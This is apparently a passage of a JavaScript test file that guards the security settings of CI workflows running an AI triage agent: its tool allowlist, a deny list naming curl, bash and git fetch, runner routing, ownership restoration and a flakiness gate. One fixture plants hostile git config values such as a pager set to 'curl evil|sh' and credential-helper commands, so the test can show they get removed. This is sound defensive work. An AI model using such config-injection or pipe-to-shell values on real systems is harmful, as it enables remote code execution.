// Regression guards for the security-critical invariants of the Qwen Triage
// workflow. These broke silently once already: the `settings_json:` input name
// was wrong (the action reads `settings:`), so it was dropped and the review
// agent ran with the full default toolset and no deny list. A future edit that
// renames the key back, weakens the deny list, loosens the fork-PR runner
// routing, or breaks the git exec-vector cleanup would have no other test to
// catch it — this file is that test.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { parse } from 'yaml';

const workflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'qwen-triage.yml',
);
const doc = parse(readFileSync(workflowPath, 'utf8'));
const cacheProducerPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'npm-cache.yml',
);
const cacheProducerDoc = parse(readFileSync(cacheProducerPath, 'utf8'));
const prWorkflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  '..',
  '.qwen',
  'skills',
  'triage',
  'references',
  'pr-workflow.md',
);
const prSkill = readFileSync(prWorkflowPath, 'utf8');
const triageJob = doc.jobs.triage;
const steps = triageJob.steps;
const triageStep = steps.find((s) => s.id === 'triage');
const cleanStep = steps.find((s) => s.name === 'Clean stale agent state');
const triageOwnershipStep = steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const verifyJob = doc.jobs.verify;
const verifyOwnershipStep = verifyJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const tmuxJob = doc.jobs['tmux-testing'];
const tmuxOwnershipStep = tmuxJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);

const ciWorkflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'ci.yml',
);
const ciDoc = parse(readFileSync(ciWorkflowPath, 'utf8'));
const ciTestJob = ciDoc.jobs.test;
const ciOwnershipStep = ciTestJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const ciCleanStep = ciTestJob.steps.find(
  (s) => s.name === 'Clean stale .qwen before checkout',
);

const prReviewWorkflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'qwen-code-pr-review.yml',
);
const prReviewDoc = parse(readFileSync(prReviewWorkflowPath, 'utf8'));
const prReviewJob = prReviewDoc.jobs['review-pr'];
const prReviewOwnershipStep = prReviewJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const ciWebShellJob = ciDoc.jobs.web_shell_e2e_smoke;
const ciWebShellOwnershipStep = ciWebShellJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const ciIntegrationJob = ciDoc.jobs.integration_cli;
const ciIntegrationOwnershipStep = ciIntegrationJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);

// A probe that only checks .qwen/.git reports "healthy" on workspace-wide
// poisoning (root-owned node_modules/dist, no .qwen/.git) and skips the
// chown that main did unconditionally — checkout then fails with EACCES.
// Recovery must stay unconditional and run before checkout; these tests
// guard against re-adding the probe gating, the inert rename-aside
// fallback, or moving the restore below the checkout step.
const assertUnconditional = (jobSteps, step, label) => {
  assert.ok(step, `${label} must have a "Restore workspace ownership" step`);
  assert.match(
    step.run,
    /chown -R "\$RUNNER_UID:\$RUNNER_GID" "\$GITHUB_WORKSPACE"/,
    `${label} must restore ownership of the whole workspace`,
  );
  assert.match(
    step.run,
    /sudo -n chown -R "\$RUNNER_UID:\$RUNNER_GID" "\$GITHUB_WORKSPACE"/,
    `${label} must keep the sudo fallback that recovers root-owned files on a non-root runner`,
  );
  assert.match(
    step.run,
    /chmod -R u\+rwX "\$GITHUB_WORKSPACE"/,
    `${label} must restore write permission of the whole workspace`,
  );
  assert.doesNotMatch(
    step.run,
    /recovery_needed|\.probe\./,
    `${label} must not gate recovery behind a .qwen/.git probe — poisoning is workspace-wide`,
  );
  assert.doesNotMatch(
    step.run,
    /\.stale\./,
    `${label} must not rename dirs aside — the rename-aside fallback never unblocks checkout`,
  );
  const restoreIdx = jobSteps.indexOf(step);
  const checkoutIdx = jobSteps.findIndex((s) => /^Checkout/.test(s.name));
  assert.ok(
    restoreIdx !== -1 && checkoutIdx !== -1 && restoreIdx < checkoutIdx,
    `${label} ownership restore must run before checkout`,
  );
};

describe('qwen-triage: agent tool/permission settings', () => {
  it('passes `settings:` (not the silently-dropped `settings_json:`)', () => {
    assert.ok(triageStep, 'triage step (id: triage) must exist');
    assert.ok(
      typeof triageStep.with.settings === 'string',
      'triage step must pass a `settings` string',
    );
    assert.equal(
      triageStep.with.settings_json,
      undefined,
      '`settings_json` is silently ignored by the action — never use it',
    );
  });

  it('settings is valid JSON that restricts the toolset', () => {
    const settings = JSON.parse(triageStep.with.settings);
    const core = settings.tools?.core;
    assert.ok(
      Array.isArray(core),
      'tools.core must be an array (registration allowlist)',
    );
    for (const t of [
      'run_shell_command',
      'read_file',
      'grep_search',
      'glob',
      'write_file',
      'agent',
      'enter_worktree',
      'exit_worktree',
    ]) {
      assert.ok(core.includes(t), `tools.core must include ${t}`);
    }
    // The whitelist exists to drop network/persistence tools an injected agent
    // could exfiltrate through — they must not be registered.
    for (const forbidden of ['web_fetch', 'web_search', 'save_memory']) {
      assert.ok(
        !core.includes(forbidden),
        `tools.core must NOT register ${forbidden}`,
      );
    }
  });

  it('settings denies interpreters, network, and PR-code-materializing git/gh', () => {
    const deny = JSON.parse(triageStep.with.settings).permissions?.deny ?? [];
    for (const d of [
      'run_shell_command(node)',
      'run_shell_command(npm)',
      'run_shell_command(bash)',
      'run_shell_command(curl)',
      'run_shell_command(git fetch)',
      'run_shell_command(git checkout)',
      'run_shell_command(gh pr checkout)',
    ]) {
      assert.ok(deny.includes(d), `permissions.deny must include ${d}`);
    }
    // No sandbox key: the ECS pool ships no container runtime, and adding one
    // would silently disable the step.
    assert.equal(
      JSON.parse(triageStep.with.settings).sandbox,
      undefined,
      'settings must not set a sandbox key',
    );
  });
});

describe('qwen-triage: fork-PR runner routing', () => {
  const runsOn = String(triageJob['runs-on']);
  const authorizeJob = doc.jobs.authorize;
  const authorizeRunsOn = String(authorizeJob['runs-on']);

  it('routes the ECS pool on same-repo or a REAL write-permission check', () => {
    assert.match(runsOn, /head\.repo\.full_name == github\.repository/);
    // The boundary is the collaborator-permission lookup authorize computes,
    // NOT the coarse author_association: MEMBER admits any org member and
    // COLLABORATOR admits read-only invitees — neither implies write access
    // on this repo, and this job's agent loads bot PATs and a model key.
    assert.match(
      runsOn,
      /needs\.authorize\.outputs\.author_can_write == 'true'/,
    );
    assert.doesNotMatch(runsOn, /author_association/);
    assert.match(runsOn, /ecs-qwen/);
  });

  it('keeps the authorize gate itself on the same-repo guard', () => {
    // authorize IS the permission check (and loads CI_BOT_PAT); it cannot
    // route on its own output and must not widen to association-based trust.
    assert.match(
      authorizeRunsOn,
      /head\.repo\.full_name == github\.repository/,
    );
    assert.doesNotMatch(authorizeRunsOn, /author_association/);
    assert.doesNotMatch(authorizeRunsOn, /needs\./);
  });

  it('computes author_can_write from the collaborator-permission API', () => {
    assert.equal(
      authorizeJob.outputs.author_can_write,
      '${{ steps.perm.outputs.author_can_write }}',
    );
    const perm = authorizeJob.steps.find((s) => s.id === 'perm');
    assert.ok(
      String(perm.env.PR_AUTHOR).includes(
        'github.event.pull_request.user.login',
      ),
    );
    assert.match(perm.run, /collaborators\/\$\{PR_AUTHOR\}\/permission/);
    assert.match(
      perm.run,
      /admin\|maintain\|write\) echo "author_can_write=true"/,
    );
  });

  it('falls back to an ephemeral hosted runner', () => {
    assert.match(runsOn, /ubuntu-latest/);
  });

  it('keeps issue triage on ECS (issues carry no foreign code)', () => {
    assert.match(runsOn, /github\.event_name == 'issues'/);
  });
});

describe('qwen-triage: git exec-vector cleanup', () => {
  it('exists and uses a keep-known-safe allowlist (invert-match), not a denylist', () => {
    assert.ok(cleanStep, "'Clean stale agent state' step must exist");
    assert.match(cleanStep.run, /git config --local --name-only --list/);
    assert.match(cleanStep.run, /grep -ivE/, 'must invert-match an allowlist');
    assert.match(cleanStep.run, /--unset-all/);
  });

  it('sweeps symlinked hooks, not just regular files', () => {
    assert.match(
      cleanStep.run,
      /-type f\s+-o\s+-type l/,
      'hook find must match -type f OR -type l (a symlinked hook survives a bare -type f)',
    );
  });

  // Steady-state regression: on a reused runner this step has already
  // sanitized the config, so the next run's grep matches nothing and exits 1.
  // Under the Actions default `bash -e` shell plus the script's own
  // `set -o pipefail`, an unguarded grep killed the whole step exactly when
  // there was nothing to clean (run 30095456731). The allowlist test below
  // can't catch this: it re-assembles the pipeline without the shell flags
  // and always plants non-allowlisted keys. So run the *actual* step script
  // under the actual flags against the nothing-to-clean state.
  describe('steady state: nothing to clean (real step script, bash -e)', () => {
    // The stage-draft cleanup touches a literal /tmp glob; neuter that one
    // line so the test never deletes files outside its scratch dir.
    const hermetic = cleanStep.run.replace(/^rm -f \/tmp\/stage-[^\n]*$/m, ':');
    let dir;

    before(() => {
      assert.notEqual(hermetic, cleanStep.run, 'stage-draft rm line not found');
      dir = mkdtempSync(join(tmpdir(), 'triage-steady-'));
      spawnSync('git', ['-C', dir, 'init', '-q']);
    });

    after(() => dir && rmSync(dir, { recursive: true, force: true }));

    const runStep = (script) =>
      spawnSync('bash', ['-e', '-c', script], {
        cwd: dir,
        encoding: 'utf8',
        env: { ...process.env, RUNNER_TEMP: join(dir, 'rt') },
      });

    it('succeeds when every config key is already allowlisted', () => {
      const res = runStep(hermetic);
      assert.equal(res.status, 0, res.stderr || res.stdout);
      assert.match(res.stdout, /stale agent state cleaned/);
    });

    it('negative control: without the grep guard the same state kills the step', () => {
      const unguarded = hermetic.replace(' || true; }', '; }');
      assert.notEqual(
        unguarded,
        hermetic,
        'grep guard (`|| true`) not found in clean step',
      );
      assert.notEqual(runStep(unguarded).status, 0);
    });
  });

  // Behavioral test: run the workflow's *actual* allowlist pattern (extracted
  // from the step) against a scratch repo. Proves the regex both unsets exec
  // vectors and preserves the plumbing actions/checkout needs — a broken
  // pattern (e.g. accidentally allowing `filter.`, or dropping `remote.`) fails
  // here even though the structural assertions above still pass.
  describe('allowlist behavior (workflow pattern, real git)', () => {
    const patternMatch = cleanStep.run.match(/grep -ivE '([^']+)'/);
    let dir;

    before(() => {
      assert.ok(
        patternMatch,
        'clean step must contain a single-quoted `grep -ivE` allowlist',
      );
      dir = mkdtempSync(join(tmpdir(), 'triage-cfg-'));
      const set = (k, v) =>
        spawnSync('git', ['-C', dir, 'config', '--local', k, v]);
      spawnSync('git', ['-C', dir, 'init', '-q']);
      // plumbing actions/checkout needs (must survive)
      set('core.repositoryformatversion', '0');
      set('remote.origin.url', 'https://github.com/x/y');
      set('remote.origin.fetch', '+refs/heads/*:refs/remotes/origin/*');
      set('branch.main.remote', 'origin');
      set('safe.directory', dir);
      set('submodule.s.url', 'https://github.com/x/s');
      // exec vectors across every family (must be unset)
      set('core.hooksPath', '/evil');
      set('core.pager', 'curl evil|sh');
      set('core.fsmonitor', '/evil');
      set('filter.lfs.process', 'evil');
      set('url.https://evil/.insteadOf', 'https://github.com/');
      set('credential.helper', '!evil');
      set('includeIf.gitdir:/x/.path', '/evil');
      set('include.path', '/evil');
      set('alias.st', '!evil');
      set('submodule.s.update', '!cmd');
      set('sequence.editor', 'evil');
      set('diff.external', 'evil');
      // apply the workflow's own pipeline (real grep + git, not a JS re-impl)
      const script =
        'git config --local --name-only --list 2>/dev/null ' +
        `| grep -ivE '${patternMatch[1]}' ` +
        '| while IFS= read -r key; do git config --local --unset-all "$key" 2>/dev/null || true; done';
      const res = spawnSync('bash', ['-c', script], {
        cwd: dir,
        encoding: 'utf8',
        env: { ...process.env, GIT_DIR: join(dir, '.git') },
      });
      assert.equal(res.status, 0, res.stderr);
    });

    after(() => dir && rmSync(dir, { recursive: true, force: true }));

    const remaining = () =>
      spawnSync(
        'git',
        ['-C', dir, 'config', '--local', '--name-only', '--list'],
        {
          encoding: 'utf8',
        },
      ).stdout.toLowerCase();

    for (const vec of [
      'hookspath',
      'core.pager',
      'fsmonitor',
      'filter.',
      'url.https',
      'credential',
      'includeif',
      'include.path',
      'alias.',
      'submodule.s.update',
      'sequence.editor',
      'diff.external',
    ]) {
      it(`unsets exec vector: ${vec}`, () => {
        assert.doesNotMatch(remaining(), new RegExp(vec.replace(/\./g, '\\.')));
      });
    }

    for (const kept of [
      'core.repositoryformatversion',
      'remote.origin.url',
      'remote.origin.fetch',
      'branch.main.remote',
      'safe.directory',
      'submodule.s.url',
    ]) {
      it(`preserves checkout plumbing: ${kept}`, () => {
        assert.match(remaining(), new RegExp(kept.replace(/\./g, '\\.')));
      });
    }
  });
});

describe('qwen-triage: workspace ownership restore', () => {
  it('verify: restores write permission before returning the workspace to the runner', () => {
    assert.ok(verifyOwnershipStep, 'verify ownership-restore step must exist');
    assert.equal(
      verifyOwnershipStep.if,
      'always()',
      'ownership restore must run unconditionally — without always(), a failed/cancelled verify leaves root-owned files that break the next checkout',
    );
    assert.match(
      verifyOwnershipStep.run,
      /chmod -R u\+rwX "\$GITHUB_WORKSPACE"/,
      'verify hardens the workspace before the agent runs, so cleanup must restore owner write bits across the whole workspace, not just .qwen',
    );

    const chmodIndex = verifyOwnershipStep.run.indexOf(
      'chmod -R u+rwX "$GITHUB_WORKSPACE"',
    );
    const chownIndex = verifyOwnershipStep.run.indexOf(
      'chown -R "$RUNNER_UID:$RUNNER_GID" "$GITHUB_WORKSPACE"',
    );
    assert.ok(
      chmodIndex < chownIndex,
      'the root-owned read-only tree must be made writable before ownership is returned',
    );
    assert.match(
      verifyOwnershipStep.run,
      /stat -c '%u' "\$RUNNER_TEMP"/,
      'verify runs as root in a container; RUNNER_UID must come from stat on RUNNER_TEMP, not id -u (which returns 0 and skips the chown)',
    );
  });

  it('tmux-testing: returns ownership to the runner unconditionally', () => {
    assert.ok(
      tmuxOwnershipStep,
      'tmux-testing ownership-restore step must exist',
    );
    assert.equal(
      tmuxOwnershipStep.if,
      'always()',
      'ownership restore must run unconditionally — the prepare step chowns to node:node; without always(), a failed/cancelled run leaves node-owned files that break the next checkout',
    );
    assert.match(
      tmuxOwnershipStep.run,
      /chown -R "\$RUNNER_UID:\$RUNNER_GID" "\$GITHUB_WORKSPACE"/,
      'tmux-testing must return workspace ownership to the runner',
    );
    assert.match(
      tmuxOwnershipStep.run,
      /stat -c '%u' "\$RUNNER_TEMP"/,
      'tmux-testing runs as root in a container; RUNNER_UID must come from stat on RUNNER_TEMP, not id -u (which returns 0 and skips the chown)',
    );
  });

  it('verify: a chmod failure is visible, not silent', () => {
    assert.match(
      verifyOwnershipStep.run,
      /::warning::could not restore workspace write permissions/,
      'chmod failure must emit a ::warning::, not be swallowed by || true',
    );
  });

  it('verify: a chown failure is visible, not silent', () => {
    assert.match(
      verifyOwnershipStep.run,
      /::warning::could not restore workspace ownership/,
      'chown failure must emit a ::warning::, not be swallowed by || true',
    );
    assert.match(
      verifyOwnershipStep.run,
      /::warning::could not determine runner UID/,
      'a stat failure (UID=0 fallback) must emit a ::warning::, not silently skip the restore',
    );
  });

  it('tmux-testing: restores write permission as well as ownership', () => {
    assert.match(
      tmuxOwnershipStep.run,
      /chmod -R u\+rwX "\$GITHUB_WORKSPACE"/,
      'tmux-testing must chmod the workspace so a read-only tree does not survive the restore',
    );
  });

  it('tmux-testing: a chown failure is visible, not silent', () => {
    assert.match(
      tmuxOwnershipStep.run,
      /::warning::could not restore workspace ownership/,
      'chown failure must emit a ::warning::, not be swallowed by || true',
    );
    assert.match(
      tmuxOwnershipStep.run,
      /::warning::could not determine runner UID/,
      'a stat failure (UID=0 fallback) must emit a ::warning::, not silently skip the restore',
    );
  });

  it('triage: restores ownership before checkout on the ECS pool', () => {
    assertUnconditional(steps, triageOwnershipStep, 'qwen-triage triage');
  });
});

describe('ci.yml: self-hosted checkout jobs restore ownership unconditionally', () => {
  it('test job restores ownership unconditionally', () => {
    assertUnconditional(ciTestJob.steps, ciOwnershipStep, 'ci.yml test');
  });

  it('web_shell_e2e_smoke restores ownership unconditionally', () => {
    assertUnconditional(
      ciWebShellJob.steps,
      ciWebShellOwnershipStep,
      'ci.yml web_shell_e2e_smoke',
    );
  });

  it('integration_cli restores ownership unconditionally', () => {
    assertUnconditional(
      ciIntegrationJob.steps,
      ciIntegrationOwnershipStep,
      'ci.yml integration_cli',
    );
  });

  it('cleanup step removes .qwen but no longer any .stale.* dirs', () => {
    assert.ok(
      ciCleanStep,
      'ci.yml test job must keep its "Clean stale .qwen before checkout" step',
    );
    assert.match(
      ciCleanStep.run,
      /\$GITHUB_WORKSPACE\/\.qwen/,
      'cleanup must remove .qwen by absolute path',
    );
    assert.match(
      ciCleanStep.run,
      /sudo -n rm -rf/,
      'cleanup must fall back to sudo for root-owned dirs',
    );
    assert.match(
      ciCleanStep.run,
      /\[ ! -L "\$GITHUB_WORKSPACE\/\.qwen" \]/,
      'cleanup must not follow a symlinked .qwen: chmod -R dereferences a symlinked argument and would widen an outside tree',
    );
    assert.doesNotMatch(
      ciCleanStep.run,
      /\.stale\./,
      'cleanup must not reference .stale.* dirs once rename-aside is gone',
    );
  });
});

describe('qwen-code-pr-review.yml: ownership recovery is unconditional', () => {
  it('restores ownership without probe gating or rename-aside', () => {
    assertUnconditional(
      prReviewJob.steps,
      prReviewOwnershipStep,
      'qwen-code-pr-review.yml review-pr',
    );
  });
});

describe('qwen-triage: Stage 1e revert-pattern signals', () => {
  it('includes high-risk path detection', () => {
    assert.ok(prSkill.includes('1e. High-risk path'));
    assert.ok(prSkill.includes('openaiContentGenerator'));
    assert.ok(prSkill.includes('streamingToolCallParser'));
    assert.ok(prSkill.includes('geminiChat'));
    assert.ok(prSkill.includes('acpConnection'));
    assert.ok(prSkill.includes('(^|/)shell\\.ts$'));
    assert.ok(prSkill.includes('shellExecutionService'));
    assert.ok(prSkill.includes('mcp-client'));
    assert.ok(prSkill.includes('mcp-pool'));
    assert.ok(prSkill.includes('LspServer'));
    assert.ok(prSkill.includes('acp-integration'));
    assert.ok(prSkill.includes('(^|/)relaunch\\.ts$'));
    assert.ok(prSkill.includes('(^|/)sandbox\\.ts$'));
    assert.ok(prSkill.includes('electron-run-as-node'));
    assert.ok(prSkill.includes('p = 0.006'));
    assert.ok(prSkill.includes('do not skip any Stage 2 enrichment'));
    assert.ok(prSkill.includes('gh api --paginate'));
    assert.ok(prSkill.includes('|| true'));
    assert.ok(prSkill.includes('WARNING: could not fetch PR files'));
  });

  it('includes Risk field in the Stage 1 comment template', () => {
    assert.ok(prSkill.includes('Risk: <if Stage 1e matched'));
  });
});

describe('qwen-triage: npm cache restore-only invariant', () => {
  for (const [jobName, jobDef] of [
    ['verify', verifyJob],
    ['tmux-testing', tmuxJob],
  ]) {
    it(`${jobName}: uses actions/cache/restore with no save path`, () => {
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      assert.ok(cacheStep, `'Restore npm cache' step must exist in ${jobName}`);
      assert.match(
        cacheStep.uses,
        /^actions\/cache\/restore@/,
        'must use the restore-only variant (no post-save hook)',
      );
      for (const s of jobDef.steps) {
        if (s.uses) {
          assert.doesNotMatch(
            s.uses,
            /actions\/cache(\/save)?@/,
            `${jobName} must not have a cache save or full cache action`,
          );
        }
      }
    });

    it(`${jobName}: npm ci --cache matches the restored directory`, () => {
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      const prepareStep = jobDef.steps.find(
        (s) => s.name === 'Install and build PR app',
      );
      assert.ok(
        prepareStep,
        `'Install and build PR app' step must exist in ${jobName}`,
      );
      const dir = cacheStep.with.path.replace(
        /^\$\{\{\s*runner\.temp\s*\}\}\//,
        '',
      );
      assert.ok(dir, 'cache path must resolve to a directory name');
      assert.ok(
        prepareStep.run.includes(`--cache "$RUNNER_TEMP/${dir}"`),
        `npm ci must use --cache "$RUNNER_TEMP/${dir}"`,
      );
    });

    it(`${jobName}: clears stale npm cache before restore`, () => {
      const clearIdx = jobDef.steps.findIndex(
        (s) => s.name === 'Clear stale npm cache',
      );
      const restoreIdx = jobDef.steps.findIndex(
        (s) => s.name === 'Restore npm cache',
      );
      assert.ok(
        clearIdx !== -1,
        `'Clear stale npm cache' step must exist in ${jobName}`,
      );
      assert.ok(
        restoreIdx !== -1,
        `'Restore npm cache' step must exist in ${jobName}`,
      );
      assert.ok(
        clearIdx < restoreIdx,
        'clear step must come before restore step',
      );
      assert.match(
        jobDef.steps[clearIdx].run,
        /rm -rf/,
        'clear step must rm -rf the cache directory',
      );
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      const dir = cacheStep.with.path.replace(
        /^\$\{\{\s*runner\.temp\s*\}\}\//,
        '',
      );
      assert.ok(
        jobDef.steps[clearIdx].run.includes(`/${dir}"`),
        `clear step must remove the restored cache directory (${dir})`,
      );
    });

    it(`${jobName}: reports the cache hit so a permanent miss is visible`, () => {
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      assert.equal(
        cacheStep.id,
        'npm-cache',
        'restore step needs an id so its cache-hit output is readable',
      );
      const reportStep = jobDef.steps.find(
        (s) => s.name === 'Report npm cache hit',
      );
      assert.ok(reportStep, "'Report npm cache hit' step must exist");
      assert.match(
        reportStep.run,
        /steps\.npm-cache\.outputs\.cache-hit/,
        'report step must surface the cache-hit output',
      );
    });
  }
});

describe('qwen-triage: npm cache producer workflow', () => {
  const saveJob = cacheProducerDoc.jobs.save;

  it('triggers on push to main only', () => {
    const push = cacheProducerDoc.on.push ?? cacheProducerDoc[true]?.push;
    assert.ok(push, 'must have a push trigger');
    assert.deepEqual(push.branches, ['main']);
    assert.deepEqual(push.paths, ['package-lock.json']);
  });

  it('saves with the same key and path the triage lanes restore', () => {
    const saveStep = saveJob.steps.find((s) =>
      s.uses?.startsWith('actions/cache/save@'),
    );
    assert.ok(saveStep, 'must have an actions/cache/save step');
    for (const [jobName, jobDef] of [
      ['verify', verifyJob],
      ['tmux-testing', tmuxJob],
    ]) {
      const restoreStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      assert.equal(
        saveStep.with.path,
        restoreStep.with.path,
        `cache path must match ${jobName} restore path`,
      );
      assert.equal(
        saveStep.with.key,
        restoreStep.with.key,
        `cache key must match ${jobName} restore key`,
      );
    }
  });

  it('populates the cache directory it saves', () => {
    const saveStep = saveJob.steps.find((s) =>
      s.uses?.startsWith('actions/cache/save@'),
    );
    assert.ok(saveStep, 'must have an actions/cache/save step');
    const dir = saveStep.with.path.replace(
      /^\$\{\{\s*runner\.temp\s*\}\}\//,
      '',
    );
    assert.ok(dir, 'save path must resolve to a directory name');
    const populateStep = saveJob.steps.find(
      (s) => s.name === 'Populate npm cache',
    );
    assert.ok(populateStep, "'Populate npm cache' step must exist");
    assert.ok(
      populateStep.run.includes(`--cache "$RUNNER_TEMP/${dir}"`),
      `populate step must fill the saved cache directory (--cache "$RUNNER_TEMP/${dir}")`,
    );
  });

  it('runs on the same target as the consumers so the cache version matches', () => {
    // actions/cache scopes an entry by a hash of the literal cache path plus
    // the compression method. A producer on a different runner or outside the
    // container image computes a different version, so every restore misses
    // even when the key and path strings match — pin runs-on + image to the
    // consumers' so both match by construction.
    for (const [jobName, jobDef] of [
      ['verify', verifyJob],
      ['tmux-testing', tmuxJob],
    ]) {
      assert.deepEqual(
        saveJob['runs-on'],
        jobDef['runs-on'],
        `producer runs-on must match ${jobName}`,
      );
      assert.equal(
        saveJob.container.image,
        jobDef.container.image,
        `producer container image must match ${jobName}`,
      );
    }
    assert.equal(
      saveJob.container.options,
      '--init --user node',
      'producer must not leave root-owned files on the self-hosted runner',
    );
  });
});

describe('qwen-triage: flakiness gate (#9125)', () => {
  const recordStep = verifyJob.steps.find(
    (s) => s.name === 'Record changed test files for the flakiness gate',
  );
  const flakeStep = verifyJob.steps.find((s) => s.id === 'flake');
  const prepareStep = verifyJob.steps.find(
    (s) => s.name === 'Install and build PR app',
  );
  const agentStep = verifyJob.steps.find(
    (s) => s.name === 'Run verification agent',
  );
  const publishStep = doc.jobs['publish-verify'].steps.find(
    (s) => s.name === 'Post verification report comment',
  );

  it('records the changed-test list BEFORE the workspace is handed to the build user', () => {
    assert.ok(recordStep, 'record step must exist');
    assert.ok(flakeStep, 'flake gate step must exist');
    const recordIdx = verifyJob.steps.indexOf(recordStep);
    const prepareIdx = verifyJob.steps.indexOf(prepareStep);
    const flakeIdx = verifyJob.steps.indexOf(flakeStep);
    // After npm ci, PR lifecycle code owns .git and could rewrite the diff
    // to hide a test file — the list must be pinned while .git is still
    // root-owned, and the gate must consume that pinned list after the build.
    assert.ok(
      recordIdx < prepareIdx,
      'the list must be recorded before install/build runs PR lifecycle code',
    );
    assert.ok(
      prepareIdx < flakeIdx,
      'the gate needs node_modules, so it must run after install/build',
    );
    assert.match(
      recordStep.run,
      /HEAD\^1/,
      'diff must be against the merge base',
    );
    assert.match(
      recordStep.run,
      /git -c core\.quotePath=false diff --name-only/,
      'non-ASCII filenames must not be C-quoted out of the gate list',
    );
    // The "two statements, not a pipeline" property is load-bearing: a git
    // failure must fail the step loudly; only a no-match grep may yield an
    // empty list. A `git diff ... | grep ... || true` pipeline would
    // swallow the failure as "no changed test files" and certify the PR
    // with an n/a gate.
    // Exact-line pin (round-4 R2-P1): the earlier `[^|)]` separator class
    // admitted `;`/`&` status swallowing inside the substitution, and a
    // `git diff` adjacency check can never match the mandated `-c` form.
    // Pinning the whole assignment leaves no room for any separator.
    assert.match(
      recordStep.run,
      /^\s*files="\$\(git -c core\.quotePath=false diff --name-only --diff-filter=ACMR 'HEAD\^1' HEAD\)"$/m,
      'git diff must run as a standalone, exactly-shaped assignment — no pipeline, no `;`/`&` status swallowing',
    );
    // The intake extension set is load-bearing: dropping `mjs` would
    // silently drop .github/scripts/*.test.mjs files from the gate list in
    // production — behavioral scenarios plant the list by hand and cannot
    // see the record step narrow.
    assert.ok(
      recordStep.run.includes(
        "grep -E '\\.(test|spec)\\.(ts|tsx|js|jsx|mjs|cjs)$'",
      ),
      'the intake extension set must stay pinned',
    );
    assert.match(
      recordStep.run,
      /flake-gate-files/,
      'the record step must write the list where the gate reads it',
    );
    assert.match(
      flakeStep.run,
      /flake-gate-files/,
      'the gate must read the recorded list, not re-derive the diff',
    );
    // Word-based, not adjacency: `git -c … diff` is still a re-derivation.
    // The gate's own `git checkout`/`git clean` reset lines stay legal.
    assert.doesNotMatch(
      flakeStep.run,
      /\bgit\b[^\n]*\bdiff\b/,
      'the gate must not re-derive the diff from post-build git metadata in any spelling',
    );
  });

  it('runs PR test code as the build user with no tokens, and fails open', () => {
    assert.equal(flakeStep.env.GITHUB_TOKEN, '', 'no GitHub token in the gate');
    assert.equal(flakeStep.env.GH_TOKEN, '', 'no gh token in the gate');
    // Line-anchored (round-4 R2-P1): an unanchored substring is satisfied
    // by a comment while the invocation itself runs as root — and this one
    // line also pins the per-invocation `timeout` cap, without which a
    // single hung test holds the invocation to the job timeout's SIGKILL,
    // which the EXIT-trap fail-open cannot survive.
    assert.match(
      flakeStep.run,
      /^\s*timeout -k 30 600 runuser -u node -- \\$/m,
      'PR test code must run as the build user under the per-invocation timeout cap',
    );
    assert.match(
      flakeStep.run,
      /unset ACTIONS_RUNTIME_TOKEN ACTIONS_RUNTIME_URL ACTIONS_CACHE_URL/,
      'cache-service credentials must be stripped before PR test code runs',
    );
    assert.match(
      flakeStep.run,
      /env -u GITHUB_OUTPUT -u GITHUB_STATE -u GITHUB_ENV -u GITHUB_PATH -u GITHUB_STEP_SUMMARY/,
      'runner-injection files must be invisible to PR test code',
    );
    // Whole-env pin: any future secret added to this step env reaches
    // process.env of PR test code, so it must be an explicit test decision.
    assert.deepEqual(
      Object.keys(flakeStep.env).sort(),
      ['FLAKE_ROUNDS', 'GH_TOKEN', 'GITHUB_TOKEN'],
      'the gate env must stay tokens-blanked and secret-free',
    );
    assert.match(
      flakeStep.run,
      /NODE_OPTIONS='--max-old-space-size=3072' CI=true TMPDIR="\$inv_tmp"/,
      'child env must pin CI parity, the heap limit, and the per-invocation TMPDIR',
    );
    assert.match(
      flakeStep.run,
      /^\s*set -uo pipefail/m,
      'the gate must not opt into -e',
    );
    // The runner wraps run: blocks in `bash -e -o pipefail`, and `set -uo`
    // does NOT clear that inherited -e — only an explicit `set +e` does.
    // Without it the first failing test invocation kills the step (round-1
    // sandboxed verify blocker), and the behavioral suite below proves the
    // same end to end under the wrapper.
    assert.match(
      flakeStep.run,
      /^\s*set \+e$/m,
      'the gate must explicitly clear the runner wrapper -e',
    );
    assert.match(
      flakeStep.run,
      /trap on_gate_exit EXIT/,
      'abnormal exits (set -u deaths) must be converted to the error verdict',
    );
    assert.doesNotMatch(
      flakeStep.run,
      /set -euo/,
      'a gate bug must fail OPEN (verdict error), never abort the verify job',
    );
    // Round-4 Critical: the reset must run AS THE BUILD USER — a root
    // checkout restores node-mutated tracked files as new root-owned
    // inodes that later node rounds cannot write (EACCES divergence) —
    // and must also drop untracked residue (`git clean -fd`, no -x so
    // gitignored node_modules/dist survive). Line-anchored: a comment
    // cannot satisfy these.
    assert.match(
      flakeStep.run,
      /^\s*runuser -u node -- git checkout -- \. 2>\/dev\/null \|\| true$/m,
      'the tracked-file restore must run as the build user',
    );
    assert.match(
      flakeStep.run,
      /^\s*runuser -u node -- git clean -fd 2>\/dev\/null \|\| true$/m,
      'untracked round residue must be cleaned without touching gitignored build outputs',
    );
    assert.match(
      flakeStep.run,
      /^\s*pkill -u node \|\| true$/m,
      'each round must tear down leftover test-user processes',
    );
